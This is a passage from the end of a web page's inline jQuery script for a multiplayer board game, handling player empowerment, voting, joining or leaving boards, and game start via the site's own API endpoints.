			target = $(this).closest('.player').attr('data-id');

			$.get('/api/board/empower', {
				'board': board,
				'player': me_id,
				'target': target,
			}).done(function(data) {
				console.log('Empower result received', data);
				if (data.success) {
					last_action = data.action;
					empowerPlayer(target);
				}
			}).fail(function(data) {
				console.error(data);
			});
		});

		$('#user_table tbody').on("change", 'tr td input[type=radio][name=voteId]', function() {
			//console.log($(this));
			//alert($(this).closest('tr').attr('data-id'));
			$.get('/api/board/vote', {
				'board': board,
				'player': me_id,
				'target': $(this).closest('tr').attr('data-id'),
			}).done(function(data) {
				console.log('Vote result received', data);
				if (data.success) {
					//
				} else {
					$(this).prop('checked', false);
				}
			}).fail(function(data) {
				console.error(data);
			});
		});

		$('#board_list table > tbody').on("click", 'tr > td > .see', function() {
			getBoard($(this).closest('tr').attr('data-id'));
		});

		$('#game_board .board-countdown').on("click", 'button', function() {
			button = $(this);

			button.attr('disabled', true);
			button.find('span').fadeOut(function() {
				$(this).html('<i class="fa fa-fw fa-spinner fa-spin"></i>');
			}).fadeIn();

			inGame = $("#user_table tbody tr[data-id='"+me_id+"']").length;

			action = inGame ? 'leave' : 'join';

			$.get('/api/board/'+action, {
				'board': board,
				'player': me_id,
			}).done(function(data) {
				console.log('Join result received', data);
				if (data.success) {
					button.find('span').fadeOut(function() {
						if (inGame) {
							$(this).html(lang['board_left']);
						} else {
							$(this).html(lang['board_joined']);
						}
						button.addClass('btn-success').removeClass('btn-primary');
					}).fadeIn();
				} else {
					button.prop('disabled', false);
					button.find('span').fadeOut(function() {
						if (inGame) {
							$(this).html(lang['board_failed_leave']);
						} else {
							$(this).html(lang['board_failed_join']);
						}
						button.addClass('btn-danger').removeClass('btn-primary');
						setTimeout(function() {
							button.find('span').fadeOut(function() {
								if (inGame) {
									$(this).html(lang['board_leave']);
								} else {
									$(this).html(lang['board_join']);
								}
								button.addClass('btn-primary').removeClass('btn-danger');
							}).fadeIn();
						}, 2000);
					}).fadeIn();
				}
			}).fail(function(data) {
				console.error(data);
			});
		});

		$('#game_board').on("finish.countdown", '.board-countdown > .countdown', function() {
			$.get('/api/board/startGame', {
				'board': board,
			}).done(function(data) {
				console.log('Start result received', data);
				if (data.success) {
					if (data.started) {
						getBoard(board);
					} else {
						getBoadList();
					}
				}
			}).fail(function(data) {
				console.error(data);
			});
		});

		$('.navbar-nav a.auto-close').on('click', function() {
			$('#topbar .navbar-collapse').collapse('hide');
		});
	});
	</script>
</body>
</html>
